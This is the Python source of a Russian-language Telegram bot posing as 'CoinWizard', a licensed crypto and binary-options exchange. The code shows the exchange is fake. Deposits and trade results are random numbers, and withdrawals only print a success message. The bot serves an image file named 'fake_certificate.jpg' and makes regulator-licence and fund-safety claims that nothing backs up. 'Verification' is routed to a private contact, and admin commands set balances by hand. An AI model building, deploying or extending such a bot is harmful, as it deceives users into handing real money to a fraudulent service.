# bot.py

# Импортируем необходимые модули и классы из библиотеки `python-telegram-bot`
from telegram import ReplyKeyboardMarkup, InlineKeyboardMarkup, InlineKeyboardButton, Update
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters

# Импортируем функции для работы с базой данных и обработки торгов
from database import init_db, add_user, get_user, update_balance, process_trade, withdraw_funds, win, lose, dep_balance

from admin_commands import admin_add_balance, admin_verify_user, admin_set_balance

# Импортируем модуль для генерации случайных чисел
import random

# Используется для получения текущего курса криптовалют
import requests

import logging

import asyncio

# Импортируем токен бота из конфигурационного файла
from config import BOT_TOKEN

# Инициализация базы данных при запуске бота
init_db()

active_tasks = {}

# Настраиваем логирование
logging.basicConfig(level=logging.INFO)

# Функция для получения текущего курса криптовалюты
def get_crypto_price(symbol):
    url = f"https://api.coingecko.com/api/v3/simple/price?ids={symbol}&vs_currencies=usd"
    try:
        response = requests.get(url)
        response.raise_for_status()
        data = response.json()
        return data[symbol]['usd']
    except Exception as e:
        print(f"Ошибка получения курса {symbol}: {e}")
        return None


# Обработчик команды /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Получаем информацию о пользователе, который вызвал команду /start
    user = update.effective_user
    
    # Добавляем пользователя в базу данных, если его там еще нет
    add_user(user.id, user.username)

    # Создаем меню кнопок (Reply Keyboard) для основного интерфейса
    reply_keyboard = [
        ["💼 Личный Кабинет", "🔷 О сервисе"],
        ["🧑🏻‍💻 Тех.Поддержка", "📊 Опционы"]
    ]
    reply_markup = ReplyKeyboardMarkup(reply_keyboard, resize_keyboard=True)

    # Отправляем приветственное сообщение с меню кнопок
    await update.message.reply_text(
        f"Привет, {user.username}! Добро пожаловать в бота. Выберите действие:",
        reply_markup=reply_markup
    )

# Обработчик текстовых сообщений
async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Получаем текст сообщения и ID пользователя
    text = update.message.text
    user_id = update.message.from_user.id

    # Обрабатываем различные текстовые команды
    if text in ("💼 Личный Кабинет", "⬅️ Назад в личный кабинет"):
        # Получаем информацию о пользователе из базы данных
        user = get_user(user_id)
        if user:
            # Путь к изображению для личного кабинета
            image = "./assets/project-1.jpg"

            # Определяем статус верификации
            verification_status = "✅" if user[8] else "❌"

            # Формируем текст сообщения с информацией о пользователе
            caption = (
                f"💻 Личный кабинет:\n\n"
                f"➖➖➖➖➖➖➖➖➖➖➖➖➖➖\n"
                f"📑 Верификация: {verification_status}\n"
                f"🗄 ID: {user[0]}\n"
                f"💵 Баланс: {user[2]}₽\n"
                f"➖➖➖➖➖➖➖➖➖➖➖➖➖➖\n"
                f"ℹ️ Статистика пользователя:\n"
                f"┏ Всего сделок проведено: {user[3]}\n"
                f"┣ Неудачных: {user[5]}\n"
                f"┣ Удачных: {user[4]}\n"
                f"┗ Выводов совершено {user[6]} на сумму {user[7]}₽\n"
                f"➖➖➖➖➖➖➖➖➖➖➖➖➖➖\n\n"
                f"_Откройте двери в мир криптовалют вместе с CoinWizard - Вашим верным спутником в онлайн трейдинге на финансовых рынках._"
            )

            # Создаем инлайн-кнопки для личного кабинета
            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("💳 Пополнить", callback_data="replenish"), InlineKeyboardButton("🏦 Вывести", callback_data="withdraw")],
                [InlineKeyboardButton("🗃 Верификация", callback_data="verify"), InlineKeyboardButton("⚙️ Настройки", callback_data="settings")],
                [InlineKeyboardButton("Мои активы", callback_data="my_assets")]
            ])

            # Отправляем изображение с текстом и инлайн-кнопками
            await context.bot.send_photo(
                chat_id=update.effective_chat.id,
                photo=image,
                caption=caption,
                parse_mode="Markdown",
                reply_markup=keyboard
            )
        else:
            # Если пользователь не найден, отправляем сообщение об ошибке
            await update.message.reply_text("Ошибка: пользователь не найден.")


    elif text == "🔷 О сервисе":
        # Формируем текст с информацией о сервисе
        service_text = (
            "*CoinWizard* - централизованная биржа для торговли криптовалютой и фьючерсными активами.\n\n"
            "🔹 *Ведущие инновации*\n"
            "┗ Мы не стоим на месте и находимся в постоянном стремлении к совершенству. Внедрение передовых решений и установление новых тенденций делает нас лидерами отрасли.\n\n"
            "🔹 *Лояльность клиентов*\n"
            "┗ Доступная каждому возможность стать профессиональным трейдером. Установление долгосрочных отношений за счет отзывчивости и регулярного оказания первоклассных услуг.\n\n"
            "🔹 *Общий успех*\n"
            "┗ Наша задача — предоставлять клиентам по всему миру простую и доступную торговлю, которая позволяет зарабатывать на финансовых рынках в любое время и в любом месте.\n\n"
            "Благодаря простому пользовательскому интерфейсу *CoinWizard* прекрасно подходит для новичков. На платформе легко ориентироваться, что привлекает как продвинутых, так и начинающих трейдеров и инвесторов."
        )

        # Создаем инлайн-кнопки
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("📖 Условия", callback_data="service_terms"), InlineKeyboardButton("📜 Сертификат", callback_data="service_certificate")],
            [InlineKeyboardButton("Гарантия сервиса", callback_data="service_guarantee"), InlineKeyboardButton("📈 Состояние сети", callback_data="service_network")],
            [InlineKeyboardButton("⚙️ Реферальная система", callback_data="service_referral")]
        ])

        # Отправляем сообщение с текстом и кнопками
        await update.message.reply_text(service_text, reply_markup=keyboard, parse_mode="Markdown")
        
    elif text == "🧑🏻‍💻 Тех.Поддержка":
        # Формируем текст для обращения в техподдержку
        support_text = (
            "📘 Вы можете открыть заявку в службу поддержки CoinWizard. Специалист ответит Вам в ближайшие сроки.\n"
            "Для более быстрого решения проблемы описывайте возникшую проблему максимально четко. "
            "При необходимости, Вы можете прикрепить изображения (скриншоты, квитанции и т.д.)\n\n"
            "Правила обращения в тех. поддержку:\n\n"
            "1. Пожалуйста, представьтесь при первом обращении.\n"
            "2. Описывайте проблему своими словами, но как можно подробнее.\n"
            "3. Если возможно, прикрепите скриншот, на котором видно, в чём заключается Ваша проблема.\n"
            "4. Пришлите Ваш ID личного кабинета, дабы ускорить решение проблемы.\n"
            "5. Относитесь к агенту поддержки с уважением. Не грубите ему и не дерзите, если заинтересованы в скорейшем разрешении Вашего вопроса."
        )

        # Создаем инлайн-кнопку для перехода в чат с техподдержкой
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("📩 Написать", url="https://t.me/durov")] # Поменяйте ссылку на свой аккаунт
        ])

        # Отправляем сообщение с текстом и кнопкой
        await update.message.reply_text(support_text, reply_markup=keyboard)

    elif text == "📊 Опционы":
        # Формируем текст с информацией о опционах
        options_text = (
            "_Опционы - это финансовые инструменты, которые дают инвестору право, но не обязательство, купить или продать определенное количество акций или других активов по определенной цене в определенный момент в будущем.\n\n_"
            "*💠 Выберите монету для инвестирования денежных средств:*"
        )

        # Создаем инлайн-кнопки с выбором криптовалют
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("BTC", callback_data="option_btc"), InlineKeyboardButton("ETH", callback_data="option_eth")],
            [InlineKeyboardButton("BNB", callback_data="option_bnb"), InlineKeyboardButton("XRP", callback_data="option_xrp")],
            [InlineKeyboardButton("ADA", callback_data="option_ada"), InlineKeyboardButton("SOL", callback_data="option_sol")],
            [InlineKeyboardButton("DOGE", callback_data="option_doge"), InlineKeyboardButton("DOT", callback_data="option_dot")],
        ])

        # Отправляем сообщение с текстом и кнопками
        await update.message.reply_text(options_text, reply_markup=keyboard, parse_mode="Markdown")
        
    elif context.user_data.get("awaiting_withdrawal"):
        try:
            amount = float(text)  # Преобразуем введенный текст в число
            if amount < 1000:
                await update.message.reply_text("❌ Минимальная сумма вывода: 1000₽.")
            else:
                # Пытаемся выполнить вывод средств
                success = withdraw_funds(user_id, amount)
                if success:
                    # Сообщение об успешном выводе
                    await update.message.reply_text(f"✅ Вывод {amount}₽ успешно выполнен!")
                else:
                    # Сообщение о недостатке средств
                    await update.message.reply_text("❌ Недостаточно средств на балансе.")
                    
        except ValueError:
            await update.message.reply_text("❌ Введите корректную сумму.")
        
        # Сбрасываем состояние "ожидание ввода суммы вывода"
        context.user_data["awaiting_withdrawal"] = False
        return  # Важно: завершаем выполнение, чтобы не перейти к другим условиям

    elif context.user_data.get("state") == "WAITING_FOR_AMOUNT":
        try:
            # Получаем сумму от пользователя
            amount = float(update.message.text)
            
            # Проверка на минимальную сумму
            if amount < 5000:
                await update.message.reply_text("Сумма должна быть не меньше 5000 руб. Попробуйте снова.")
            elif amount <= 0:
                await update.message.reply_text("Сумма должна быть больше нуля. Попробуйте снова.")
            else:
                # Обновляем баланс пользователя
                user_id = update.effective_user.id
                dep_balance(user_id, amount)
                
                # Получаем обновленную информацию о пользователе
                user_info = get_user(user_id)
                await update.message.reply_text(
                    f"Баланс успешно пополнен на {amount:.2f} руб.\n"
                    f"Ваш текущий баланс: {user_info[2]:.2f} руб."
                )
                context.user_data["state"] = None  # Сбрасываем состояние

        except ValueError:
            await update.message.reply_text("Пожалуйста, введите корректное числовое значение.")

    elif context.user_data.get("state") == "WAITING_FOR_INVESTMENT":
        await process_investment_amount(update, context)
        return
    
    elif context.user_data.get("state") == "WAITING_FOR_DIRECTION":
        await handle_graph_direction(update, context)
        return
    
    else:
        # Если текст сообщения не распознан, отправляем сообщение с просьбой выбрать опцию
        await update.message.reply_text("Я не понял ваш запрос. Попробуйте выбрать одну из доступных опций.")
        

# Обработчик инлайн-кнопок
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Получаем данные из callback-запроса
    query = update.callback_query
    user_id = query.from_user.id
    await query.answer()  # Подтверждаем получение callback-запроса
    
    # Обрабатываем различные callback_data
    if query.data == "replenish":
        # Формируем текст и кнопки для пополнения баланса
        text = "💳 *Выберите вариант пополнения баланса:*"
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("Пополнить через банковскую карту", callback_data="deposit_card")],
            [InlineKeyboardButton("Пополнить криптовалютой", callback_data="deposit_crypto")],
            [InlineKeyboardButton("Ввести промокод", callback_data="deposit_promo")]
        ])
        # Обновляем сообщение с новым текстом и кнопками
        await query.edit_message_caption(caption=text, reply_markup=keyboard, parse_mode="Markdown")

    # Обработчик для кнопки "Пополнение через карту"
    elif query.data == "deposit_card":
        # Просим пользователя ввести сумму для пополнения
        await query.message.reply_text(
            "Введите сумму для пополнения баланса (минимум 5.000₽):"
        )
        context.user_data["state"] = "WAITING_FOR_AMOUNT"  # Устанавливаем состояние ожидания суммы

    elif query.data == "deposit_crypto":
        # Генерируем случайную сумму для пополнения криптовалютой
        amount = random.randint(100000, 300000)
        update_balance(user_id, amount)
        user = get_user(user_id)

        if user:
            text = (
                f"💵 *Пополнение успешно!*\n\n"
                f"На ваш баланс добавлено {amount}₽ криптовалютой.\n"
                f"Текущий баланс: {user[2]}₽."
            )
        else:
            text = "❌ *Ошибка:* Пользователь не найден."

        # Обновляем сообщение с результатом пополнения
        await query.edit_message_caption(caption=text, parse_mode="Markdown")

    elif query.data == "deposit_promo":
        # Запрашиваем ввод промокода
        text = "🎟️ *Введите промокод:*\nПожалуйста, введите ваш промокод для активации баланса."
        await query.edit_message_caption(caption=text, parse_mode="Markdown")
        
    elif query.data == "my_assets":
        # Формируем текст с информацией о текущих активах
        text = (
            "💼 *Активы:*\n\n"
            "Активы - это финансовые инструменты, которые трейдеры покупают или продают на рынке для получения прибыли. "
            "Это могут быть различные виды финансовых инструментов, включая акции, валюты, сырьевые товары, облигации, опционы и другие.\n\n"
            "🗄 *Активы:*\n"
            "┏ BTC: 0.0\n"
            "┣ ETH: 0.0\n"
            "┣ USDT: 0.0\n"
            "┣ SHIB: 0.0\n"
            "┗ ATOM: 0.0"
        )

        # Создаем инлайн-кнопки для управления активами
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("Покупка", callback_data="buy_assets"), InlineKeyboardButton("Продажа", callback_data="sell_assets")],
            [InlineKeyboardButton("Трейд", callback_data="trade_assets")]
        ])

        # Обновляем сообщение с новым текстом и кнопками
        await query.edit_message_caption(caption=text, reply_markup=keyboard, parse_mode="Markdown")
        
    elif query.data == "buy_assets":
        # Запрашиваем выбор актива для покупки
        text = "🛒 *Выберите актив для покупки:*\nBTC, ETH, USDT, SHIB, ATOM."
        await query.edit_message_caption(caption=text, parse_mode="Markdown")

    elif query.data == "sell_assets":
        # Запрашиваем выбор актива для продажи
        text = "💰 *Выберите актив для продажи:*\nBTC, ETH, USDT, SHIB, ATOM."
        await query.edit_message_caption(caption=text, parse_mode="Markdown")

    elif query.data == "trade_assets":
        # Обрабатываем трейд и получаем результат
        success, amount = process_trade(user_id)
        user = get_user(user_id)

        if success:
            text = (
                f"✅ *Удачный трейд!*\n\n"
                f"Вы заработали {amount}₽.\n"
                f"Ваш баланс обновлен: {user[2]}₽."
            )
        else:
            text = (
                f"❌ *Неудачный трейд!*\n\n"
                f"Вы потеряли {amount}₽.\n"
                f"Ваш баланс обновлен: {user[2]}₽."
            )

        # Создаем кнопку для возврата к активам
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("⬅️ Назад", callback_data="my_assets")],
        ])

        # Обновляем сообщение с результатом трейда и кнопкой
        await query.edit_message_caption(caption=text, reply_markup=keyboard, parse_mode="Markdown")
    
    elif query.data == "withdraw":
    # Получаем данные о пользователе
        user = get_user(user_id)
        if user:
            # Формируем сообщение с запросом суммы вывода
            text = (
                f"💸 Введите сумму вывода:\n\n"
                f"У вас на балансе: {user[2]}₽\n"
                f"Минимальная сумма вывода: 1000₽"
            )

            # Добавляем инлайн-кнопку "❌ Отмена"
            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("❌ Отмена", callback_data="cancel_withdrawal")]
            ])

            # Редактируем сообщение с текстом и кнопкой
            await query.edit_message_caption(
                caption=text,
                reply_markup=keyboard,
                parse_mode="Markdown"
            )

            # Сохраняем состояние "ожидание ввода суммы вывода"
            context.user_data["awaiting_withdrawal"] = True
    
    
    elif query.data == "cancel_withdrawal":
    # Отменяем вывод
        await query.edit_message_caption(
            caption="✅ Вывод отменен.",
            parse_mode="Markdown"
        )

        # Убираем состояние "ожидание ввода суммы вывода"
        if "awaiting_withdrawal" in context.user_data:
            del context.user_data["awaiting_withdrawal"]
            
    elif query.data.startswith("update_course_"):
        crypto_symbol = query.data.split("_")[-1]
        crypto_name = crypto_symbol.upper()  # Можно настроить имена для каждой монеты
        await handle_crypto_option(update, context, crypto_symbol, crypto_name)
        
    elif query.data == "cancel_crypto_option":
        await query.edit_message_text("✅ Вы вернулись к выбору опционов.")
            
    elif query.data == "option_btc":
        await handle_crypto_option(update, context, "bitcoin", "BITCOIN")
        
    elif query.data == "option_eth":
        await handle_crypto_option(update, context, "ethereum", "ETHEREUM")
        
    elif query.data == "verify":
        # Формируем текст сообщения для верификации
        text = (
            "🤷🏻‍♀️ К сожалению, Ваш аккаунт в данный момент не верифицирован. Рекомендуем Вам пройти верификацию аккаунта. "
            "Вы можете это сделать, нажав на кнопку ниже и написав 'Верификация' в тех. поддержку.\n\n"
            "Верифицированные аккаунты обладают рядом преимуществ над обычными. Среди них:\n\n"
            "🔷 Приоритет в очереди на выплату.\n\n"
            "🔷 Отсутствие лимитов на вывод средств.\n\n"
            "🔷 Возможность хранить средства на счету личного кабинета в разных активах.\n\n"
            "🔷 Увеличение доверия со стороны администрации и агентов технической поддержки; минимальный шанс блокировки аккаунта ввиду подозрительной активности."
        )

        # Добавляем кнопку для перехода в техническую поддержку
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("💬 Связаться с тех. поддержкой", url="https://t.me/durov")] # Поменяйте ссылку на свой аккаунт
        ])

        # Обновляем сообщение с текстом и кнопкой
        await query.edit_message_caption(caption=text, reply_markup=keyboard, parse_mode="Markdown")
        
    elif query.data == "service_certificate":
    # Путь к изображению сертификата
        certificate_image = "./assets/fake_certificate.jpg"  # Убедитесь, что изображение находится по указанному пути
        
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙", callback_data="delete_message")]
        ])

        # Отправляем изображение с текстовым описанием
        await context.bot.send_photo(
            chat_id=update.effective_chat.id,
            photo=certificate_image,
            reply_markup=keyboard,
            parse_mode="Markdown"
        )
        
    elif query.data == "service_guarantee":
        text = (u"🔹 *CoinWizard* - онлайн-биржа, предоставляющая услуги торговли бинарными опционами и другими финансовыми инструментами.\n\n"
            u"_Важно понимать, что в любой финансовой сфере существуют риски, связанные с инвестированием и торговлей. Поэтому никакая биржа или компания не может дать полные гарантии прибыли или отсутствия рисков. Тем не менее, CoinWizard может предоставить своим клиентам некоторые гарантии, чтобы обеспечить надежность и безопасность своих услуг._\n\n"
            "*Некоторые возможные гарантии, которые может предоставить CoinWizard, включают в себя:*\n\n"
            "🔒 *Безопасность средств клиентов:* CoinWizard гарантирует сохранность средств клиентов на отдельных банковских счетах, отделенных от собственных средств компании. Это обеспечивает защиту пользователей от возможных финансовых рисков, связанных с банкротством биржи.\n\n"
            "⚙️ *Безопасность транзакций:* CoinWizard использует высокоэффективные системы шифрования и защиты данных, чтобы обеспечить безопасность транзакций и защиту конфиденциальной информации клиентов.\n\n"
            "🌐 *Прозрачность и открытость:* CoinWizard предоставляет полную информацию о своих услугах, комиссиях, правилах и условиях, а также предоставляет своим клиентам возможность проверять свои счета.\n\n"
            "🦹🏼‍♂️ *Обучение и поддержка:* CoinWizard предоставляет полную поддержку своим клиентам, помогая им улучшать свои торговые навыки и получать доступ к актуальной информации и аналитике.\n\n"
            "📲 *Удобство и доступность:* CoinWizard предоставляет удобную и простую платформу для торговли, а также поддерживает широкий спектр способов пополнения и вывода средств.\n\n"
            "✅ *Gembell Limited* (компания, под руководством которой предоставляются услуги CoinWizard, регулируется ЦРОФР (Номер лицензии TSRF RU 0395 AA Vv0207).\n\n"
            "Тем не менее, напоминаем, что никакая компания или биржа не может дать 100%-ю гарантию на инвестиции. Поэтому, перед тем как начать инвестировать, настоятельно рекомендуется ознакомиться с правилами и условиями биржи и тщательно изучить все возможные риски.")
        
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙", callback_data="delete_message")]
        ])
        
        await query.message.reply_text(text, reply_markup=keyboard, parse_mode="Markdown")
        
    elif query.data == "service_network":
        # Обрабатываем нажатие на кнопку "Состояние сети"
        text = (
            "📈 Состояние сети Bitcoin\n\n"
            
            "Загруженность: 🟢\n"
            "Количество блоков: ≈ 1\n"
            "Размер: 1.9 mB (1.4 mVB)\n"
            "Неподтверждённых транзакций: 2301\n\n"
            
            "Комиссия для попадания в первый блок:\n"
            "Минимум: 0.00003072 BTC / kVB\n"
            "Медиана: 0.00004096 BTC / kVB\n"
        )
        
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙", callback_data="delete_message")]
        ])
        
        await query.message.reply_text(text, reply_markup=keyboard, parse_mode="Markdown")        
        
    elif query.data == "delete_message":
    # Удаляем сообщение, на которое нажата кнопка
        await query.message.delete()

    elif query.data == "graph_up":
        await handle_graph_direction(update, context)
        return
    
    elif query.data == "graph_stay":
        await handle_graph_direction(update, context)
        return
    
    elif query.data == "graph_down":
        await handle_graph_direction(update, context)
        return
    
    elif query.data == "time_10sec":
        await handle_investment_time(update, context)
        return
    
    elif query.data == "time_30sec":
        await handle_investment_time(update, context)
        return
    
    elif query.data == "time_1min":
        await handle_investment_time(update, context)
        return
        
    else:
        await query.edit_message_text(text="❌ Ошибка: пользователь не найден.", parse_mode="Markdown")
        
# Обработчик выбора криптовалюты
async def handle_crypto_option(update: Update, context: ContextTypes.DEFAULT_TYPE, crypto_symbol, crypto_name):
    print("handle_crypto_option вызван")
    query = update.callback_query
    user_id = query.from_user.id
    await query.answer()

    # Получаем текущий курс криптовалюты
    price = get_crypto_price(crypto_symbol)
    user = get_user(user_id)

    if price is not None and user:
        context.user_data['crypto_symbol'] = crypto_symbol  # Сохраняем выбранную криптовалюту
        context.user_data['crypto_name'] = crypto_name  # Сохраняем её имя

        text = (
            f"\U0001F4C8 *{crypto_name} Инвестиции*\n\n"
            f"\U0001F310 Введите сумму, которую хотите инвестировать.\n\n"
            f"Минимальная сумма инвестиций: 1000₽\n"
            f"Курс {crypto_name}: {price}$\n\n"
            f"Ваш денежный баланс: {user[2]}₽"
        )

        # Создаем кнопки для обновления курса или отмены
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("\U0001F504 Обновить курс", callback_data=f"update_course_{crypto_symbol}")],
            [InlineKeyboardButton("\u274C Отмена", callback_data="cancel_crypto_option")]
        ])

        # Отправляем сообщение с текстом и кнопками
        await query.edit_message_text(text=text, reply_markup=keyboard, parse_mode="Markdown")

        # Сохраняем состояние ожидания ввода суммы
        context.user_data['state'] = 'WAITING_FOR_INVESTMENT'
        logging.info(f"Состояние пользователя обновлено: {context.user_data['state']}")

    else:
        # Сообщаем об ошибке, если цена недоступна или пользователь не найден
        await query.edit_message_text("Ошибка: не удалось получить данные. Попробуйте позже.")

# Обработчик для обработки текста суммы
async def process_investment_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print("process_investment_amount вызван")
    user_id = update.message.from_user.id
    user = get_user(user_id)  # Получаем данные пользователя

    if context.user_data.get('state') == 'WAITING_FOR_INVESTMENT' and user:
        try:
            amount = float(update.message.text)

            if amount < 1000:
                await update.message.reply_text("❌ Сумма должна быть не менее 1000₽. Попробуйте снова.")
            elif amount > user[2]:  # user[2] — баланс пользователя
                await update.message.reply_text("❌ Сумма превышает ваш текущий баланс. Попробуйте снова.")
            else:
                # Сохраняем сумму в user_data для дальнейшего использования
                context.user_data['investment_amount'] = amount

                # Формируем текст следующего сообщения
                text = (
                    f"✅ Вы выбрали опцион {context.user_data['crypto_name']}\n"
                    f"Сумма инвестиции: {amount}₽\n\n"
                    f"Выберите, куда пойдет график:"
                )

                # Создаем инлайн-кнопки
                keyboard = InlineKeyboardMarkup([
                    [InlineKeyboardButton("Вверх - х2", callback_data="graph_up")],
                    [InlineKeyboardButton("На месте - х10", callback_data="graph_stay")],
                    [InlineKeyboardButton("Вниз - х2", callback_data="graph_down")]
                ])

                # Отправляем сообщение с текстом и кнопками
                await update.message.reply_text(text, reply_markup=keyboard, parse_mode="Markdown")

                # Сохраняем состояние для выбора направления графика
                context.user_data['state'] = 'WAITING_FOR_DIRECTION'
                logging.info(f"Состояние пользователя обновлено: {context.user_data['state']}")
                logging.info(f"Данные пользователя сохранены: {context.user_data}")

        except ValueError:
            await update.message.reply_text("❌ Пожалуйста, введите корректное число.")
    else:
        await update.message.reply_text("Ошибка: не удалось обработать запрос.")

# Обработчик выбора направления графика
async def handle_graph_direction(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logging.info("handle_graph_direction вызван")
    logging.info(f"Callback data получен: {update.callback_query.data}")
    query = update.callback_query
    await query.answer()

    # Карта направлений графика
    direction_map = {
        "graph_up": "Вверх - х2",
        "graph_stay": "На месте - х10",
        "graph_down": "Вниз - х2"
    }

    # Получаем направление из callback_data
    direction = direction_map.get(query.data)
    if direction:
        # Проверяем наличие данных в context.user_data
        crypto_name = context.user_data.get('crypto_name')
        investment_amount = context.user_data.get('investment_amount')

        if not crypto_name or not investment_amount:
            # Логируем состояние для отладки
            print("Ошибка: отсутствуют данные об опционе или сумме.")
            print("context.user_data:", context.user_data)

            # Отправляем сообщение об ошибке
            await query.edit_message_text("❌ Ошибка: данные пользователя недоступны. Начните заново.")
            return

        # Сохраняем выбранное направление
        context.user_data['graph_direction'] = direction

        # Формируем текст следующего сообщения
        text = (
            f"✅ Выбранный опцион: {crypto_name}\n"
            f"Сумма инвестиции: {investment_amount}₽\n"
            f"Направление графика: {direction}\n\n"
            f"На какое время инвестировать?"
        )

        # Создаем кнопки для выбора времени
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("10 сек", callback_data="time_10sec")],
            [InlineKeyboardButton("30 сек", callback_data="time_30sec")],
            [InlineKeyboardButton("1 мин", callback_data="time_1min")]
        ])

        # Отправляем сообщение с текстом и кнопками
        await query.edit_message_text(text=text, reply_markup=keyboard, parse_mode="Markdown")

        # Устанавливаем состояние для выбора времени
        context.user_data['state'] = 'WAITING_FOR_TIME'
        logging.info(f"Состояние пользователя обновлено: {context.user_data['state']}")

    else:
        # Сообщаем об ошибке, если направление не найдено
        await query.edit_message_text("❌ Ошибка: неизвестное направление графика.")

async def handle_investment_time(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    # Карта времени в секундах
    time_map = {
        "time_10sec": 10,
        "time_30sec": 30,
        "time_1min": 60
    }

    # Получаем выбранное время
    time_key = query.data
    investment_time = time_map.get(time_key)

    # Проверяем наличие необходимых данных
    user_id = query.from_user.id
    crypto_name = context.user_data.get('crypto_name')
    investment_amount = context.user_data.get('investment_amount')
    direction = context.user_data.get('graph_direction')

    if not (crypto_name and investment_amount and direction and investment_time):
        await query.edit_message_text("❌ Ошибка: данные пользователя недоступны. Начните заново.")
        return

    # Завершаем предыдущую задачу, если она существует
    if user_id in active_tasks:
        active_tasks[user_id].cancel()
        del active_tasks[user_id]

    # Формируем сообщение с таймером и графиком
    text = (
        f"✅ Выбранный опцион: {crypto_name}\n"
        f"Сумма инвестиции: {investment_amount}₽\n"
        f"Направление графика: {direction}\n"
        f"Время: {investment_time} секунд\n\n"
        f"График: [Начало колебания]"
    )
    await query.edit_message_text(text)

    async def run_game():
        try:
            # Эмуляция таймера и графика
            for i in range(investment_time):
                # Генерация случайного колебания графика
                movement = random.choice(["Вверх", "На месте", "Вниз"])
                text = (
                    f"✅ Выбранный опцион: {crypto_name}\n"
                    f"Сумма инвестиции: {investment_amount}₽\n"
                    f"Направление графика: {direction}\n"
                    f"Время: {investment_time - i} секунд\n\n"
                    f"График: {movement}"
                )
                await query.edit_message_text(text)
                await asyncio.sleep(1)

            # Определение результата
            result = random.choice(["win", "lose"])
            multiplier = 2 if direction in ["Вверх - х2", "Вниз - х2"] else 10

            if result == "win":
                winnings = investment_amount * multiplier
                win(user_id, winnings)
                result_text = (
                    f"🎉 Вы выиграли!\n"
                    f"Ваш выигрыш: {winnings}₽\n"
                    f"Ваш новый баланс: {get_user(user_id)[2]}₽"
                )
            else:
                lose(user_id, investment_amount)
                result_text = (
                    f"😢 Вы проиграли.\n"
                    f"Сумма потери: {investment_amount}₽\n"
                    f"Ваш новый баланс: {get_user(user_id)[2]}₽"
                )
            await query.edit_message_text(result_text)

        except asyncio.CancelledError:
            # Обработка отмены задачи
            await query.edit_message_text("❌ Игра была прервана.")
            return

    # Запуск задачи и сохранение её ссылки
    active_tasks[user_id] = asyncio.create_task(run_game())

# Основная функция для запуска бота
if __name__ == "__main__":
    # Создаем приложение бота с использованием токена
    app = Application.builder().token(BOT_TOKEN).build()
    print("Бот запущен...")

    # Добавляем обработчики команд, текстовых сообщений и callback-запросов
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(CallbackQueryHandler(get_crypto_price))
    app.add_handler(CallbackQueryHandler(handle_graph_direction, pattern="graph_.*"))
    app.add_handler(CallbackQueryHandler(handle_crypto_option, pattern="^update_course_|cancel_crypto_option$"))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_investment_amount))
    app.add_handler(CallbackQueryHandler(handle_investment_time, pattern="time_.*"))
    app.add_handler(CommandHandler("add_balance", admin_add_balance))
    app.add_handler(CommandHandler("verify_user", admin_verify_user))
    app.add_handler(CommandHandler("set_balance", admin_set_balance))

    # Запускаем бота в режиме polling (постоянное ожидание новых сообщений)
    app.run_polling()